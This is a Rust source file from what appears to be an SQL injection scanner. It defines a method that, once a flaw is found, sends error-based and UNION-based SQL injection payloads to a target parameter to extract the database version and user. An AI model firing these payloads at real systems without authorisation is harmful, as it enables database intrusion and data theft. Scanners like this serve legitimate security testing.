use anyhow::Result;

use crate::sqx::{
    detector::SqliDetector,
    models::{SqliInfoExtraction, SqliTechnique},
    similarity::{extract_union_data, extract_version_from_error},
};

impl SqliDetector {
    /// Extract basic info via SQL injection (if vulnerability confirmed)
    pub async fn extract_info(
        &self,
        url: &str,
        param: &str,
        technique: &SqliTechnique,
    ) -> Result<SqliInfoExtraction> {
        let mut info = SqliInfoExtraction::default();

        match technique {
            SqliTechnique::ErrorBased => {
                let version_payloads = [
                    "' AND 1=CONVERT(int, @@version)-- ",
                    "' AND 1=CAST(@@version AS int)-- ",
                    "' AND 1=1/@@version-- ",
                ];
                for payload in &version_payloads {
                    let test_url = self.build_test_url(url, param, "1", payload);
                    if let Ok(response) = self.send_request(&test_url).await
                        && let Some(version) = extract_version_from_error(&response.body)
                    {
                        info.version = Some(version);
                        break;
                    }
                }
            }
            SqliTechnique::UnionBased => {
                let union_payload = "-1' UNION SELECT 1,@@version,3,4,5,6,7,8,9,10-- ";
                let test_url = self.build_test_url(url, param, "1", union_payload);
                if let Ok(response) = self.send_request(&test_url).await {
                    info.version = extract_union_data(&response.body, 2);
                    info.user = extract_union_data(&response.body, 1);
                }
            }
            _ => {}
        }

        Ok(info)
    }
}
